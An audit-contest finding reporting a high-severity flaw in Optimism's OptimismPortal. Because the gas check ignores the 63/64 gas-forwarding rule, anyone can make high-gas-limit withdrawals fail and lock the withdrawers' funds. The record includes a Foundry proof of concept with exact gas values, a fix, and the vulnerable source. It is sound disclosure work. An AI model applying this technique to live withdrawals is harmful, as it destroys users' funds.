{
  "Title": "H-2: Withdrawals with high gas limits can be bricked by a malicious user, permanently locking funds",
  "Content": "# Issue H-2: Withdrawals with high gas limits can be bricked by a malicious user, permanently locking funds \n\nSource: https://github.com/sherlock-audit/2023-01-optimism-judging/issues/96 \n\n## Found by \nAllarious, obront, ladboy233, Barichek\n\n## Summary\n\nTransactions to execute a withdrawal from the Optimism Portal require the caller to send enough gas to cover `gasLimit` specified by the withdrawer. \n\nBecause the EVM limits the total gas forwarded on to 63/64ths of the total `gasleft()` (and silently reduces it to this value if we try to send more) there are situations where transactions with high gas limits will be vulnerable to being reverted.\n\nBecause there are no replays on this contract, the result is that a malicious user can call `finalizeWithdrawalTransaction()` with a precise amount of gas, cause the withdrawer’s withdrawal to fail, and permanently lock their funds.\n\n## Vulnerability Detail\n\nWithdrawals can be withdrawn from L2's `L2ToL1MessagePasser` contract to L1's `OptimismPortal` contract. This is a less \"user-friendly\" withdrawal path, presumably for users who know what they are doing. \n\nOne of the quirks of the `OptimismPortal` is that there is no replaying of transactions. If a transaction fails, it will simply fail, and all ETH associated with it will remain in the `OptimismPortal` contract. Users have been warned of this and understand the risks, so Optimism takes no responsibility for user error.\n\nIn order to ensure that failed transactions can only happen at the fault of the user, the contract implements a check to ensure that the gasLimit is sufficient:\n\n```solidity\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    \"OptimismPortal: insufficient gas to finalize withdrawal\"\n);\n```\n\nWhen the transaction is executed, the contract requests to send along all the remaining gas, minus the hardcoded `FINALIZE_GAS_BUFFER` for actions after the call. The goal is that this will ensure that the amount of gas forwarded on is at least the gas limit specified by the user.\n\nOptimism is aware of the importance of this property being correct when they write in the comments:\n\n> “We want to maintain the property that the amount of gas supplied to the call to the target contract is at least the gas limit specified by the user. We can do this by enforcing that, at this point in time, we still have gaslimit + buffer gas available.”\n\n\nThe issue is that the EVM specifies the maximum gas that can be sent to an external call as 63/64ths of the `gasleft()`. For very large gas limits, this 1/64th that remains could be greater than the hardcoded FINALIZE_GAS_BUFFER value. In this case, less gas would be forwarded along than was directed by the contract.\n\nHere is a quick overview of the math:\n\n- We need X gas to be sent as a part of the call.\n- This means we need `X * 64 / 63` gas to be available at the time the function is called.\n- However, the only check is that we have `X + 20_000` gas a few operations prior to the call (which guarantees that we have `X + 14878` at the time of the call).\n- For any situation where `X / 64 > 14878` (in other words, when the amount of gas sent is greater than `952_192`), the caller is able to send an amount of gas that passes the check, but doesn't forward the required amount on in the call.\n\n## Impact\n\nFor any withdrawal with a gas limit of at least 952,192, a malicious user can call `finalizeWithdrawalTransaction()` with an amount of gas that will pass the checks, but will end up forwarding along less gas than was specified by the user.\n\nThe result is that the withdrawing user can have their funds permanently locked in the `OptimismPortal` contract.\n\n## Proof of Concept\n\nTo test this behavior in a sandboxed environment, you can copy the following proof of concept.\n\nHere are three simple contracts that replicate the behavior of the Portal, as well as an external contract that uses a predefined amount of gas.\n\n(Note that we added 5122 to the gas included in the call to correct for the other bug we submitted, as this issue remains even when the other bug is patched.)\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nlibrary SafeCall {\n    /**\n     * @notice Perform a low level call without copying any returndata\n     *\n     * @param _target   Address to call\n     * @param _gas      Amount of gas to pass to the call\n     * @param _value    Amount of value to pass to the call\n     * @param _calldata Calldata to pass to the call\n     */\n    function call(\n        address _target,\n        uint256 _gas,\n        uint256 _value,\n        bytes memory _calldata\n    ) internal returns (bool) {\n        bool _success;\n        assembly {\n            _success := call(\n                _gas, // gas\n                _target, // recipient\n                _value, // ether value\n                add(_calldata, 0x20), // inloc\n                mload(_calldata), // inlen\n                0, // outloc\n                0 // outlen\n            )\n        }\n        return _success;\n    }\n}\n\ncontract GasUser {\n    uint[] public s;\n\n    function store(uint i) public {\n        for (uint j = 0; j < i; j++) {\n            s.push(1);\n        }\n    }\n}\n\ncontract Portal {\n    address l2Sender;\n\n    struct Transaction {\n        uint gasLimit;\n        address sender;\n        address target;\n        uint value;\n        bytes data;\n    }\n\n    constructor(address _l2Sender) {\n        l2Sender = _l2Sender;\n    }\n\n    function execute(Transaction memory _tx) public {\n        require(\n            gasleft() >= _tx.gasLimit + 20000,\n            \"OptimismPortal: insufficient gas to finalize withdrawal\"\n        );\n\n        // Set the l2Sender so contracts know who triggered this withdrawal on L2.\n        l2Sender = _tx.sender;\n\n        // Trigger the call to the target contract. We use SafeCall because we don't\n        // care about the returndata and we don't want target contracts to be able to force this\n        // call to run out of gas via a returndata bomb.\n        bool success = SafeCall.call(\n            _tx.target,\n            gasleft() - 20000 + 5122, // fix for other bug\n            _tx.value,\n            _tx.data\n        );\n    }\n}\n```\n\nHere is a Foundry test that calls the Portal with various gas values to expose this vulnerability:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Portal.sol\";\n\ncontract PortalGasTest is Test {\n    Portal public c;\n    GasUser public gu;\n\n    function setUp() public {\n        c = new Portal(0x000000000000000000000000000000000000dEaD);\n        gu = new GasUser();\n    }\n\n    function testGasLimitForGU() public {\n        gu.store{gas: 11_245_655}(500);\n        assert(gu.s(499) == 1);\n    }\n\n    function _executePortalWithGivenGas(uint gas) public {\n        c.execute{gas: gas}(Portal.Transaction({\n            gasLimit: 11_245_655,\n            sender: address(69),\n            target: address(gu),\n            value: 0,\n            data: abi.encodeWithSignature(\"store(uint256)\", 500)\n        }));\n    }\n\n    function testPortalCatchesGasTooSmall() public {\n        vm.expectRevert(bytes(\"OptimismPortal: insufficient gas to finalize withdrawal\"));\n        _executePortalWithGivenGas(11_266_734);\n    }\n\n    function testPortalSucceedsWithEnoughGas() public {\n        _executePortalWithGivenGas(11_433_180);\n        assert(gu.s(499) == 1);\n    }\n\n    function testPortalBugWithInBetweenGasLow() public {\n        _executePortalWithGivenGas(11_266_735);\n        \n        // It now reverts because the array has a length of 0.\n        vm.expectRevert();\n        gu.s(0);\n    }\n\n    function testPortalBugWithInBetweenGasHigh() public {\n        _executePortalWithGivenGas(11_433_179);\n        \n        // It now reverts because the array has a length of 0.\n        vm.expectRevert();\n        gu.s(0);\n    }\n}\n```\nAs you can see:\n- We verify that the call to the target contract succeeds with 11,245,655 gas, and set that as gasLimit for all tests. This is the `X` from our formula above.\n- This means that we need `11_245_655 * 64 / 63 = 11_424_157` gas available at the time the call is made.\n- The test uses `9023` gas before it makes our call, so we can see that if we send `11_424_157 + 9_023 = 11_433_180` gas, the test passes.\n- Similarly, if we send `11_266_734` gas, the total gas will be small enough to fail the require check.\n- But in the sweet spot between these values, we have enough gas to pass the require check, but when we get to the call, the amount of gas requested is more than 63/64ths of the total, so the EVM sends less than we asked for. As a result, the transaction fails.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol#L310-L329\n\nhttps://github.com/sherlock-audit/2023-01-optimism/blob/main/optimism/packages/contracts-bedrock/contracts/libraries/SafeCall.sol#L17-L36\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the check to account for this 63/64 rule:\n\n```solidity\nrequire(\n    gasleft() >= (_tx.gasLimit + FINALIZE_GAS_BUFFER) * 64 / 63,\n    \"OptimismPortal: insufficient gas to finalize withdrawal\"\n);\n```\n\n## Discussion\n\n**rcstanciu**\n\nComment from Optimism\n\n---\n\n **Description:** Withdrawals with high gas limits can be bricked by a malicious user, permanently locking funds\n\n\n **Reason:** The issue is that we do not account for the 63/64ths rule specified in EIP-150 when checking the remaining gas available for executing a withdrawal transaction. This means that a malicious user can **permissionlessly** brick a withdrawal that has a minimum gas limit > 952,192 by forcing the `OptimismPortal` to forward an incorrect amount of gas, causing the withdrawal transaction to fail unexpectedly.\n\n\n **Action:** In order to fix this issue, we need to factor in the 63/64 rule specified in EIP-150 when checking the remaining gas available for executing a withdrawal transaction on L313 of the `OptimismPortal` contract. See Zach's suggestion. (**VERY IMPORTANT NOTE**: This issue exists independently of #109.)\n\n\n\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/38",
  "Code": [
    {
      "filename": "optimism/packages/contracts-bedrock/contracts/L1/OptimismPortal.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\nimport { Initializable } from \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\nimport { SafeCall } from \"../libraries/SafeCall.sol\";\nimport { L2OutputOracle } from \"./L2OutputOracle.sol\";\nimport { Constants } from \"../libraries/Constants.sol\";\nimport { Types } from \"../libraries/Types.sol\";\nimport { Hashing } from \"../libraries/Hashing.sol\";\nimport { SecureMerkleTrie } from \"../libraries/trie/SecureMerkleTrie.sol\";\nimport { AddressAliasHelper } from \"../vendor/AddressAliasHelper.sol\";\nimport { ResourceMetering } from \"./ResourceMetering.sol\";\nimport { Semver } from \"../universal/Semver.sol\";\n\n/**\n * @custom:proxied\n * @title OptimismPortal\n * @notice The OptimismPortal is a low-level contract responsible for passing messages between L1\n *         and L2. Messages sent directly to the OptimismPortal have no form of replayability.\n *         Users are encouraged to use the L1CrossDomainMessenger for a higher-level interface.\n */\ncontract OptimismPortal is Initializable, ResourceMetering, Semver {\n    /**\n     * @notice Represents a proven withdrawal.\n     *\n     * @custom:field outputRoot    Root of the L2 output this was proven against.\n     * @custom:field timestamp     Timestamp at whcih the withdrawal was proven.\n     * @custom:field l2OutputIndex Index of the output this was proven against.\n     */\n    struct ProvenWithdrawal {\n        bytes32 outputRoot;\n        uint128 timestamp;\n        uint128 l2OutputIndex;\n    }\n\n    /**\n     * @notice Version of the deposit event.\n     */\n    uint256 internal constant DEPOSIT_VERSION = 0;\n\n    /**\n     * @notice The L2 gas limit set when eth is deposited using the receive() function.\n     */\n    uint64 internal constant RECEIVE_DEFAULT_GAS_LIMIT = 100_000;\n\n    /**\n     * @notice Additional gas reserved for clean up after finalizing a transaction withdrawal.\n     */\n    uint256 internal constant FINALIZE_GAS_BUFFER = 20_000;\n\n    /**\n     * @notice Minimum time (in seconds) that must elapse before a withdrawal can be finalized.\n     */\n    uint256 public immutable FINALIZATION_PERIOD_SECONDS;\n\n    /**\n     * @notice Address of the L2OutputOracle.\n     */\n    L2OutputOracle public immutable L2_ORACLE;\n\n    /**\n     * @notice Address of the L2 account which initiated a withdrawal in this transaction. If the\n     *         of this variable is the default L2 sender address, then we are NOT inside of a call\n     *         to finalizeWithdrawalTransaction.\n     */\n    address public l2Sender;\n\n    /**\n     * @notice A list of withdrawal hashes which have been successfully finalized.\n     */\n    mapping(bytes32 => bool) public finalizedWithdrawals;\n\n    /**\n     * @notice A mapping of withdrawal hashes to `ProvenWithdrawal` data.\n     */\n    mapping(bytes32 => ProvenWithdrawal) public provenWithdrawals;\n\n    /**\n     * @notice Emitted when a transaction is deposited from L1 to L2. The parameters of this event\n     *         are read by the rollup node and used to derive deposit transactions on L2.\n     *\n     * @param from       Address that triggered the deposit transaction.\n     * @param to         Address that the deposit transaction is directed to.\n     * @param version    Version of this deposit transaction event.\n     * @param opaqueData ABI encoded deposit data to be parsed off-chain.\n     */\n    event TransactionDeposited(\n        address indexed from,\n        address indexed to,\n        uint256 indexed version,\n        bytes opaqueData\n    );\n\n    /**\n     * @notice Emitted when a withdrawal transaction is proven.\n     *\n     * @param withdrawalHash Hash of the withdrawal transaction.\n     */\n    event WithdrawalProven(\n        bytes32 indexed withdrawalHash,\n        address indexed from,\n        address indexed to\n    );\n\n    /**\n     * @notice Emitted when a withdrawal transaction is finalized.\n     *\n     * @param withdrawalHash Hash of the withdrawal transaction.\n     * @param success        Whether the withdrawal transaction was successful.\n     */\n    event WithdrawalFinalized(bytes32 indexed withdrawalHash, bool success);\n\n    /**\n     * @custom:semver 1.0.0\n     *\n     * @param _l2Oracle                  Address of the L2OutputOracle contract.\n     * @param _finalizationPeriodSeconds Output finalization time in seconds.\n     */\n    constructor(L2OutputOracle _l2Oracle, uint256 _finalizationPeriodSeconds) Semver(1, 0, 0) {\n        L2_ORACLE = _l2Oracle;\n        FINALIZATION_PERIOD_SECONDS = _finalizationPeriodSeconds;\n        initialize();\n    }\n\n    /**\n     * @notice Initializer.\n     */\n    function initialize() public initializer {\n        l2Sender = Constants.DEFAULT_L2_SENDER;\n        __ResourceMetering_init();\n    }\n\n    /**\n     * @notice Accepts value so that users can send ETH directly to this contract and have the\n     *         funds be deposited to their address on L2. This is intended as a convenience\n     *         function for EOAs. Contracts should call the depositTransaction() function directly\n     *         otherwise any deposited funds will be lost due to address aliasing.\n     */\n    // solhint-disable-next-line ordering\n    receive() external payable {\n        depositTransaction(msg.sender, msg.value, RECEIVE_DEFAULT_GAS_LIMIT, false, bytes(\"\"));\n    }\n\n    /**\n     * @notice Accepts ETH value without triggering a deposit to L2. This function mainly exists\n     *         for the sake of the migration between the legacy Optimism system and Bedrock.\n     */\n    function donateETH() external payable {\n        // Intentionally empty.\n    }\n\n    /**\n     * @notice Proves a withdrawal transaction.\n     *\n     * @param _tx              Withdrawal transaction to finalize.\n     * @param _l2OutputIndex   L2 output index to prove against.\n     * @param _outputRootProof Inclusion proof of the L2ToL1MessagePasser contract's storage root.\n     * @param _withdrawalProof Inclusion proof of the withdrawal in L2ToL1MessagePasser contract.\n     */\n    function proveWithdrawalTransaction(\n        Types.WithdrawalTransaction memory _tx,\n        uint256 _l2OutputIndex,\n        Types.OutputRootProof calldata _outputRootProof,\n        bytes[] calldata _withdrawalProof\n    ) external {\n        // Prevent users from creating a deposit transaction where this address is the message\n        // sender on L2. Because this is checked here, we do not need to check again in\n        // `finalizeWithdrawalTransaction`.\n        require(\n            _tx.target != address(this),\n            \"OptimismPortal: you cannot send messages to the portal contract\"\n        );\n\n        // Get the output root and load onto the stack to prevent multiple mloads. This will\n        // revert if there is no output root for the given block number.\n        bytes32 outputRoot = L2_ORACLE.getL2Output(_l2OutputIndex).outputRoot;\n\n        // Verify that the output root can be generated with the elements in the proof.\n        require(\n            outputRoot == Hashing.hashOutputRootProof(_outputRootProof),\n            \"OptimismPortal: invalid output root proof\"\n        );\n\n        // Load the ProvenWithdrawal into memory, using the withdrawal hash as a unique identifier.\n        bytes32 withdrawalHash = Hashing.hashWithdrawal(_tx);\n        ProvenWithdrawal memory provenWithdrawal = provenWithdrawals[withdrawalHash];\n\n        // We generally want to prevent users from proving the same withdrawal multiple times\n        // because each successive proof will update the timestamp. A malicious user can take\n        // advantage of this to prevent other users from finalizing their withdrawal. However,\n        // since withdrawals are proven before an output root is finalized, we need to allow users\n        // to re-prove their withdrawal only in the case that the output root for their specified\n        // output index has been updated.\n        require(\n            provenWithdrawal.timestamp == 0 ||\n                (_l2OutputIndex == provenWithdrawal.l2OutputIndex &&\n                    outputRoot != provenWithdrawal.outputRoot),\n            \"OptimismPortal: withdrawal hash has already been proven\"\n        );\n\n        // Compute the storage slot of the withdrawal hash in the L2ToL1MessagePasser contract.\n        // Refer to the Solidity documentation for more information on how storage layouts are\n        // computed for mappings.\n        bytes32 storageKey = keccak256(\n            abi.encode(\n                withdrawalHash,\n                uint256(0) // The withdrawals mapping is at the first slot in the layout.\n            )\n        );\n\n        // Verify that the hash of this withdrawal was stored in the L2toL1MessagePasser contract\n        // on L2. If this is true, under the assumption that the SecureMerkleTrie does not have\n        // bugs, then we know that this withdrawal was actually triggered on L2 and can therefore\n        // be relayed on L1.\n        require(\n            SecureMerkleTrie.verifyInclusionProof(\n                abi.encode(storageKey),\n                hex\"01\",\n                _withdrawalProof,\n                _outputRootProof.messagePasserStorageRoot\n            ),\n            \"OptimismPortal: invalid withdrawal inclusion proof\"\n        );\n\n        // Designate the withdrawalHash as proven by storing the `outputRoot`, `timestamp`, and\n        // `l2BlockNumber` in the `provenWithdrawals` mapping. A `withdrawalHash` can only be\n        // proven once unless it is submitted again with a different outputRoot.\n        provenWithdrawals[withdrawalHash] = ProvenWithdrawal({\n            outputRoot: outputRoot,\n            timestamp: uint128(block.timestamp),\n            l2OutputIndex: uint128(_l2OutputIndex)\n        });\n\n        // Emit a `WithdrawalProven` event.\n        emit WithdrawalProven(withdrawalHash, _tx.sender, _tx.target);\n    }\n\n    /**\n     * @notice Finalizes a withdrawal transaction.\n     *\n     * @param _tx Withdrawal transaction to finalize.\n     */\n    function finalizeWithdrawalTransaction(Types.WithdrawalTransaction memory _tx) external {\n        // Make sure that the l2Sender has not yet been set. The l2Sender is set to a value other\n        // than the default value when a withdrawal transaction is being finalized. This check is\n        // a defacto reentrancy guard.\n        require(\n            l2Sender == Constants.DEFAULT_L2_SENDER,\n            \"OptimismPortal: can only trigger one withdrawal per transaction\"\n        );\n\n        // Grab the proven withdrawal from the `provenWithdrawals` map.\n        bytes32 withdrawalHash = Hashing.hashWithdrawal(_tx);\n        ProvenWithdrawal memory provenWithdrawal = provenWithdrawals[withdrawalHash];\n\n        // A withdrawal can only be finalized if it has been proven. We know that a withdrawal has\n        // been proven at least once when its timestamp is non-zero. Unproven withdrawals will have\n        // a timestamp of zero.\n        require(\n            provenWithdrawal.timestamp != 0,\n            \"OptimismPortal: withdrawal has not been proven yet\"\n        );\n\n        // As a sanity check, we make sure that the proven withdrawal's timestamp is greater than\n        // starting timestamp inside the L2OutputOracle. Not strictly necessary but extra layer of\n        // safety against weird bugs in the proving step.\n        require(\n            provenWithdrawal.timestamp >= L2_ORACLE.startingTimestamp(),\n            \"OptimismPortal: withdrawal timestamp less than L2 Oracle starting timestamp\"\n        );\n\n        // A proven withdrawal must wait at least the finalization period before it can be\n        // finalized. This waiting period can elapse in parallel with the waiting period for the\n        // output the withdrawal was proven against. In effect, this means that the minimum\n        // withdrawal time is proposal submission time + finalization period.\n        require(\n            _isFinalizationPeriodElapsed(provenWithdrawal.timestamp),\n            \"OptimismPortal: proven withdrawal finalization period has not elapsed\"\n        );\n\n        // Grab the OutputProposal from the L2OutputOracle, will revert if the output that\n        // corresponds to the given index has not been proposed yet.\n        Types.OutputProposal memory proposal = L2_ORACLE.getL2Output(\n            provenWithdrawal.l2OutputIndex\n        );\n\n        // Check that the output root that was used to prove the withdrawal is the same as the\n        // current output root for the given output index. An output root may change if it is\n        // deleted by the challenger address and then re-proposed.\n        require(\n            proposal.outputRoot == provenWithdrawal.outputRoot,\n            \"OptimismPortal: output root proven is not the same as current output root\"\n        );\n\n        // Check that the output proposal has also been finalized.\n        require(\n            _isFinalizationPeriodElapsed(proposal.timestamp),\n            \"OptimismPortal: output proposal finalization period has not elapsed\"\n        );\n\n        // Check that this withdrawal has not already been finalized, this is replay protection.\n        require(\n            finalizedWithdrawals[withdrawalHash] == false,\n            \"OptimismPortal: withdrawal has already been finalized\"\n        );\n\n        // Mark the withdrawal as finalized so it can't be replayed.\n        finalizedWithdrawals[withdrawalHash] = true;\n\n        // We want to maintain the property that the amount of gas supplied to the call to the\n        // target contract is at least the gas limit specified by the user. We can do this by\n        // enforcing that, at this point in time, we still have gaslimit + buffer gas available.\n        require(\n            gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n            \"OptimismPortal: insufficient gas to finalize withdrawal\"\n        );\n\n        // Set the l2Sender so contracts know who triggered this withdrawal on L2.\n        l2Sender = _tx.sender;\n\n        // Trigger the call to the target contract. We use SafeCall because we don't\n        // care about the returndata and we don't want target contracts to be able to force this\n        // call to run out of gas via a returndata bomb.\n        bool success = SafeCall.call(\n            _tx.target,\n            gasleft() - FINALIZE_GAS_BUFFER,\n            _tx.value,\n            _tx.data\n        );\n\n        // Reset the l2Sender back to the default value.\n        l2Sender = Constants.DEFAULT_L2_SENDER;\n\n        // All withdrawals are immediately finalized. Replayability can\n        // be achieved through contracts built on top of this contract\n        emit WithdrawalFinalized(withdrawalHash, success);\n\n        // Reverting here is useful for determining the exact gas cost to successfully execute the\n        // sub call to the target contract if the minimum gas limit specified by the user would not\n        // be sufficient to execute the sub call.\n        if (success == false && tx.origin == Constants.ESTIMATION_ADDRESS) {\n            revert(\"OptimismPortal: withdrawal failed\");\n        }\n    }\n\n    /**\n     * @notice Accepts deposits of ETH and data, and emits a TransactionDeposited event for use in\n     *         deriving deposit transactions. Note that if a deposit is made by a contract, its\n     *         address will be aliased when retrieved using `tx.origin` or `msg.sender`. Consider\n     *         using the CrossDomainMessenger contracts for a simpler developer experience.\n     *\n     * @param _to         Target address on L2.\n     * @param _value      ETH value to send to the recipient.\n     * @param _gasLimit   Minimum L2 gas limit (can be greater than or equal to this value).\n     * @param _isCreation Whether or not the transaction is a contract creation.\n     * @param _data       Data to trigger the recipient with.\n     */\n    function depositTransaction(\n        address _to,\n        uint256 _value,\n        uint64 _gasLimit,\n        bool _isCreation,\n        bytes memory _data\n    ) public payable metered(_gasLimit) {\n        // Just to be safe, make sure that people specify address(0) as the target when doing\n        // contract creations.\n        if (_isCreation) {\n            require(\n                _to == address(0),\n                \"OptimismPortal: must send to address(0) when creating a contract\"\n            );\n        }\n\n        // Transform the from-address to its alias if the caller is a contract.\n        address from = msg.sender;\n        if (msg.sender != tx.origin) {\n            from = AddressAliasHelper.applyL1ToL2Alias(msg.sender);\n        }\n\n        // Compute the opaque data that will be emitted as part of the TransactionDeposited event.\n        // We use opaque data so that we can update the TransactionDeposited event in the future\n        // without breaking the current interface.\n        bytes memory opaqueData = abi.encodePacked(\n            msg.value,\n            _value,\n            _gasLimit,\n            _isCreation,\n            _data\n        );\n\n        // Emit a TransactionDeposited event so that the rollup node can derive a deposit\n        // transaction for this deposit.\n        emit TransactionDeposited(from, _to, DEPOSIT_VERSION, opaqueData);\n    }\n\n    /**\n     * @notice Determine if a given output is finalized. Reverts if the call to\n     *         L2_ORACLE.getL2Output reverts. Returns a boolean otherwise.\n     *\n     * @param _l2OutputIndex Index of the L2 output to check.\n     *\n     * @return Whether or not the output is finalized.\n     */\n    function isOutputFinalized(uint256 _l2OutputIndex) external view returns (bool) {\n        return _isFinalizationPeriodElapsed(L2_ORACLE.getL2Output(_l2OutputIndex).timestamp);\n    }\n\n    /**\n     * @notice Determines whether the finalization period has elapsed w/r/t a given timestamp.\n     *\n     * @param _timestamp Timestamp to check.\n     *\n     * @return Whether or not the finalization period has elapsed.\n     */\n    function _isFinalizationPeriodElapsed(uint256 _timestamp) internal view returns (bool) {\n        return block.timestamp > _timestamp + FINALIZATION_PERIOD_SECONDS;\n    }\n}"
    },
    {
      "filename": "optimism/packages/contracts-bedrock/contracts/libraries/SafeCall.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.15;\n\n/**\n * @title SafeCall\n * @notice Perform low level safe calls\n */\nlibrary SafeCall {\n    /**\n     * @notice Perform a low level call without copying any returndata\n     *\n     * @param _target   Address to call\n     * @param _gas      Amount of gas to pass to the call\n     * @param _value    Amount of value to pass to the call\n     * @param _calldata Calldata to pass to the call\n     */\n    function call(\n        address _target,\n        uint256 _gas,\n        uint256 _value,\n        bytes memory _calldata\n    ) internal returns (bool) {\n        bool _success;\n        assembly {\n            _success := call(\n                _gas, // gas\n                _target, // recipient\n                _value, // ether value\n                add(_calldata, 0x20), // inloc\n                mload(_calldata), // inlen\n                0, // outloc\n                0 // outlen\n            )\n        }\n        return _success;\n    }\n}"
    }
  ]
}